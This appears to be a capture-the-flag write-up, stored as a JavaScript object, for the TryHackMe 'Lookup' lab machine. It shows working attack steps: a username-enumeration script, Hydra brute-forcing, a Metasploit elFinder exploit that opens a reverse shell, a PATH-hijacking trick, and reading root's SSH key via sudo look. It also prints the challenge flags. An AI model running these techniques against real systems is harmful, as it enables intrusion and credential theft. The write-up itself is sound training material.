const WRITEUP = {
  slug:        "thm-lookup",
  title:       "TryHackMe — Lookup",
  date:        "2026-03-19",
  platform:    "TryHackMe",
  os:          "Linux",
  difficulty:  "easy",
  tags:        ["web", "pwn"],
  description: "Username enumeration via differential error messages, elFinder RCE (CVE-2019-9194), PATH hijacking to extract credentials, sudo look GTFOBins privesc to root.",
 
  toc: [
    { id: "overview",   label: "Overview",              level: 2 },
    { id: "recon",      label: "Recon",                 level: 2 },
    { id: "web",        label: "Web Enumeration",       level: 2 },
    { id: "enum",       label: "Username Enumeration",  level: 2 },
    { id: "hydra1",     label: "Password Brute-force",  level: 2 },
    { id: "elfinder",   label: "elFinder & CVE",        level: 2 },
    { id: "shell",      label: "Getting a Shell",       level: 2 },
    { id: "privesc1",   label: "Privesc — pwm binary",  level: 2 },
    { id: "privesc2",   label: "Privesc — sudo look",   level: 2 },
    { id: "flags",      label: "Flags",                 level: 2 },
  ],
 
  content: `
<h2 id="overview">Overview</h2>
<p>
  Lookup is an easy-rated Linux machine on TryHackMe. The attack chain starts with
  username enumeration through differential login error messages, followed by credential
  brute-forcing with Hydra. A vulnerable elFinder instance exposes the server to a known
  command injection CVE, giving us an initial shell. Privilege escalation is achieved in
  two stages — first by abusing a SUID binary via PATH hijacking to leak a password list,
  then by exploiting <code>sudo /usr/bin/look</code> to read the root SSH private key.
</p>
 
<div class="callout flag">
  <div class="callout-label">User Flag</div>
  <code>38375fb4dd8baa2b2039ac03d92b820e</code>
</div>
<div class="callout flag">
  <div class="callout-label">Root Flag</div>
  <code>5a285a9f257e45c68bb6c9f9f57d18e8</code>
</div>
 
<h2 id="recon">Recon</h2>
<p>
  Starting with a full port scan to identify the attack surface. Only two ports are
  exposed — SSH and HTTP, which is a clean and focused target.
</p>
 
<div class="code-block">
  <div class="code-block-header">
    <span class="code-lang">bash</span>
    <button class="copy-btn" onclick="copyCode(this)">copy</button>
  </div>
  <pre><code>┌──(root㉿kali)-[~]
└─# nmap -sV -T4 -p- 10.113.150.94
 
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre>
</div>
 
<h2 id="web">Web Enumeration</h2>
<p>
  Navigating to the IP redirects to <code>lookup.thm</code> — we add it to
  <code>/etc/hosts</code> to resolve it locally. The site presents a login page.
  Running Gobuster against it yields nothing interesting beyond what's already visible,
  so we shift focus to the login logic itself.
</p>
 
<figure>
  <img src="images/lookup-website.png" alt="lookup.thm login page">
  <figcaption>Fig 1. The login page at lookup.thm</figcaption>
</figure>
 
<div class="code-block">
  <div class="code-block-header">
    <span class="code-lang">bash</span>
    <button class="copy-btn" onclick="copyCode(this)">copy</button>
  </div>
  <pre><code># Add to /etc/hosts
echo "10.113.150.94  lookup.thm" >> /etc/hosts</code></pre>
</div>
 
<h2 id="enum">Username Enumeration</h2>
<p>
  Manually testing the login form reveals a subtle but critical difference in error messages:
  submitting an <strong>invalid username</strong> returns <em>"Wrong username or password."</em>,
  while submitting a <strong>valid username with a wrong password</strong> returns
  <em>"Wrong password."</em> This differential response leaks whether a username exists —
  a classic enumeration vulnerability.
</p>
<p>
  We write a short Python script to automate the enumeration against a username wordlist,
  using a throwaway password to trigger the distinguishing response.
</p>
 
<div class="code-block">
  <div class="code-block-header">
    <span class="code-lang">python</span>
    <button class="copy-btn" onclick="copyCode(this)">copy</button>
  </div>
  <pre><code>import requests
import time
 
url = "http://lookup.thm/login.php"
wordlist = "usernames.txt"
 
with open(wordlist, "r") as f:
    usernames = f.read().splitlines()
 
for username in usernames:
    data = {
        "username": username,
        "password": "fakepassword"
    }
    try:
        response = requests.post(url=url, data=data)
        if "Wrong password" in response.text:
            print(f"[+] Valid username found: {username}")
        elif "wrong username" in response.text:
            continue
        time.sleep(0.5)
    except requests.exceptions.RequestException as e:
        print(f"error with {username}: {e}")</code></pre>
</div>
 
<p>The script identifies two valid usernames:</p>
 
<div class="code-block">
  <div class="code-block-header">
    <span class="code-lang">bash</span>
    <button class="copy-btn" onclick="copyCode(this)">copy</button>
  </div>
  <pre><code>┌──(root㉿kali)-[~/Desktop/wordlists]
└─# python script.py
 
[+] Valid username found: admin
[+] Valid username found: jose</code></pre>
</div>
 
<h2 id="hydra1">Password Brute-force</h2>
<p>
  With valid usernames in hand we run Hydra against the login form. We target
  <code>jose</code> since brute-forcing <code>admin</code> would typically be noisier
  and less likely to succeed with a standard wordlist. Hydra quickly finds the password.
</p>
 
<div class="code-block">
  <div class="code-block-header">
    <span class="code-lang">bash</span>
    <button class="copy-btn" onclick="copyCode(this)">copy</button>
  </div>
  <pre><code>hydra -l jose -P /usr/share/wordlists/rockyou.txt lookup.thm \
  http-post-form "/login.php:username=^USER^&password=^PASS^:Wrong" -V
 
[80][http-post-form] host: lookup.thm   login: jose   password: password123</code></pre>
</div>
 
<h2 id="elfinder">elFinder &amp; CVE-2019-9194</h2>
<p>
  Logging in as <code>jose</code> redirects us to <code>files.lookup.thm</code> — another
  virtual host we add to <code>/etc/hosts</code>. The file manager is immediately
  recognisable as <strong>elFinder</strong>. Checking the About dialog reveals version
  <strong>2.1.47</strong>.
</p>
 
<figure>
  <img src="images/lookup-elfinder.png" alt="elFinder file manager">
  <figcaption>Fig 2. elFinder running at files.lookup.thm</figcaption>
</figure>
 
<figure>
  <img src="images/lookup-elfinder-version.png" alt="elFinder version 2.1.47">
  <figcaption>Fig 3. About dialog confirming elFinder 2.1.47</figcaption>
</figure>
 
<p>
  A quick search surfaces <strong>CVE-2019-9194</strong> — a command injection vulnerability
  in the elFinder PHP connector via the <code>exiftran</code> image rotation feature.
  Metasploit has a ready-made module for it rated <em>excellent</em>.
</p>
 
<div class="callout tip">
  <div class="callout-label">CVE-2019-9194</div>
  elFinder &lt;= 2.1.47 — command injection via <code>exiftran</code> in the PHP connector.
  Triggered by uploading a crafted filename that gets passed unsanitised to a shell command.
</div>
 
<h2 id="shell">Getting a Shell</h2>
<p>
  We load the Metasploit module, set the target host to <code>files.lookup.thm</code>,
  configure our LHOST, and run the exploit. It uploads a payload disguised as a JPEG,
  triggers the vulnerability via image rotation, and opens a Meterpreter session.
</p>
 
<div class="code-block">
  <div class="code-block-header">
    <span class="code-lang">bash</span>
    <button class="copy-btn" onclick="copyCode(this)">copy</button>
  </div>
  <pre><code>msf6 > search cve-2019-9194
msf6 > use exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection
msf6 exploit(...) > set rhosts files.lookup.thm
msf6 exploit(...) > set lhost 10.113.80.234
msf6 exploit(...) > run
 
[*] Started reverse TCP handler on 10.113.80.234:4444
[*] Uploading payload 'CDR60Iu2.jpg;echo 6370202e2e...706870 |xxd -r -p |sh& #.jpg'
[*] Triggering vulnerability via image rotation ...
[*] Executing payload (/elFinder/php/.UU700UYTAU.php) ...
[+] Meterpreter session 1 opened (10.113.80.234:4444 -> 10.113.150.94:46882)
 
meterpreter ></code></pre>
</div>
 
<p>
  We land as <code>www-data</code>. Browsing <code>/etc/passwd</code> reveals another user
  — <code>think</code>. His home directory contains a <code>.passwords</code> file and
  <code>user.txt</code>, but both are unreadable with our current permissions.
</p>
 
<div class="code-block">
  <div class="code-block-header">
    <span class="code-lang">bash</span>
    <button class="copy-btn" onclick="copyCode(this)">copy</button>
  </div>
  <pre><code>meterpreter > ls -la /home/think
 
100640/rw-r-----  525   fil   .passwords
100640/rw-r-----  33    fil   user.txt
040640/rw-r-----  4096  dir   .ssh</code></pre>
</div>
 
<h2 id="privesc1">Privesc — SUID pwm &amp; PATH Hijacking</h2>
<p>
  Dropping into a system shell and hunting for SUID binaries turns up something unusual —
  <code>/usr/sbin/pwm</code>, owned by root and not a standard system binary.
</p>
 
<div class="code-block">
  <div class="code-block-header">
    <span class="code-lang">bash</span>
    <button class="copy-btn" onclick="copyCode(this)">copy</button>
  </div>
  <pre><code>find / -perm /4000 2>/dev/null
# ...
/usr/sbin/pwm
 
ls -la /usr/sbin/pwm
-rwsr-sr-x 1 root root 17176 Jan 11  2024 /usr/sbin/pwm</code></pre>
</div>
 
<p>
  Running it reveals the behaviour — it calls <code>id</code> to determine the current
  username, then attempts to read <code>/home/&lt;username&gt;/.passwords</code>.
  Since we are <code>www-data</code>, it looks for a non-existent file.
  The key insight is that <code>id</code> is called by name without an absolute path,
  making it vulnerable to <strong>PATH hijacking</strong>.
</p>
 
<div class="code-block">
  <div class="code-block-header">
    <span class="code-lang">bash</span>
    <button class="copy-btn" onclick="copyCode(this)">copy</button>
  </div>
  <pre><code>/usr/sbin/pwm
[!] Running 'id' command to extract the username and user ID (UID)
[!] ID: www-data
[-] File /home/www-data/.passwords not found</code></pre>
</div>
 
<p>
  We prepend <code>/tmp</code> to <code>PATH</code>, then write a fake <code>id</code>
  script there that outputs the <code>think</code> user's identity. Once
  <code>pwm</code> is tricked into thinking it's running as <code>think</code>, it
  happily reads and dumps <code>/home/think/.passwords</code>.
</p>
 
<div class="code-block">
  <div class="code-block-header">
    <span class="code-lang">bash</span>
    <button class="copy-btn" onclick="copyCode(this)">copy</button>
  </div>
  <pre><code># Prepend /tmp to PATH so our fake 'id' takes priority
export PATH=/tmp:$PATH
 
# Write a fake id binary that impersonates think
echo '#!/bin/bash' > /tmp/id
echo 'echo "uid=1000(think) gid=1000(think) groups=1000(think)"' >> /tmp/id
chmod +x /tmp/id
 
# Run pwm — it now reads /home/think/.passwords
/usr/sbin/pwm
[!] Running 'id' command to extract the username and user ID (UID)
[!] ID: think
jose1006
jose1004
jose1002
...</code></pre>
</div>
 
<p>
  We save the leaked passwords to a file and use Hydra to brute-force SSH for the
  <code>think</code> account.
</p>
 
<div class="code-block">
  <div class="code-block-header">
    <span class="code-lang">bash</span>
    <button class="copy-btn" onclick="copyCode(this)">copy</button>
  </div>
  <pre><code>┌──(root㉿kali)-[~]
└─# hydra -l think -P passws.txt -t 4 ssh://lookup.thm
 
[22][ssh] host: lookup.thm   login: think   password: josemario.AKA(think)
1 of 1 target successfully completed, 1 valid password found</code></pre>
</div>
 
<p>
  We SSH in as <code>think</code> and grab the user flag.
</p>
 
<div class="code-block">
  <div class="code-block-header">
    <span class="code-lang">bash</span>
    <button class="copy-btn" onclick="copyCode(this)">copy</button>
  </div>
  <pre><code>think@ip-10-113-150-94:~$ cat user.txt
38375fb4dd8baa2b2039ac03d92b820e</code></pre>
</div>
 
<h2 id="privesc2">Privesc — sudo look (GTFOBins)</h2>
<p>
  Checking sudo permissions for <code>think</code> reveals one allowed command —
  <code>/usr/bin/look</code>. This is a classic GTFOBins entry: <code>look</code> reads
  lines from a file that start with a given prefix. Passing an empty string as the prefix
  causes it to print the entire file, effectively giving us arbitrary file read as root.
</p>
 
<div class="code-block">
  <div class="code-block-header">
    <span class="code-lang">bash</span>
    <button class="copy-btn" onclick="copyCode(this)">copy</button>
  </div>
  <pre><code>think@ip-10-113-150-94:~$ sudo -l
 
User think may run the following commands on ip-10-113-150-94:
    (ALL) /usr/bin/look</code></pre>
</div>
 
<figure>
  <img src="images/lookup-gtfobins.png" alt="GTFOBins entry for look">
  <figcaption>Fig 4. GTFOBins showing how to abuse sudo look for file read</figcaption>
</figure>
 
<p>
  We use it to read root's SSH private key directly from <code>/root/.ssh/id_rsa</code>,
  copy it to our machine, set the correct permissions, and log in as root.
</p>
 
<div class="code-block">
  <div class="code-block-header">
    <span class="code-lang">bash</span>
    <button class="copy-btn" onclick="copyCode(this)">copy</button>
  </div>
  <pre><code># Read root's private key
think@ip-10-113-150-94:~$ sudo /usr/bin/look '' /root/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
...
-----END OPENSSH PRIVATE KEY-----
 
# On our machine — save key, set permissions, connect
┌──(root㉿kali)-[~]
└─# chmod 600 ssh_key
└─# ssh -i ssh_key root@lookup.thm</code></pre>
</div>
 
<h2 id="flags">Flags</h2>
 
<div class="callout flag">
  <div class="callout-label">User Flag</div>
  <code>38375fb4dd8baa2b2039ac03d92b820e</code>
</div>
 
<div class="callout flag">
  <div class="callout-label">Root Flag</div>
  <code>5a285a9f257e45c68bb6c9f9f57d18e8</code>
</div>
 
<hr>
 
<table>
  <thead>
    <tr><th>Step</th><th>Technique</th><th>Tool</th></tr>
  </thead>
  <tbody>
    <tr><td>Username enumeration</td><td>Differential error message analysis</td><td>Custom Python script</td></tr>
    <tr><td>Password brute-force</td><td>HTTP POST form attack</td><td>Hydra + rockyou.txt</td></tr>
    <tr><td>Initial access</td><td>CVE-2019-9194 — elFinder command injection</td><td>Metasploit</td></tr>
    <tr><td>Lateral movement</td><td>SUID binary + PATH hijacking → password leak</td><td>Manual</td></tr>
    <tr><td>SSH brute-force</td><td>Leaked password list attack</td><td>Hydra</td></tr>
    <tr><td>Root</td><td>sudo look → arbitrary file read → SSH key</td><td>GTFOBins</td></tr>
  </tbody>
</table>
`,
};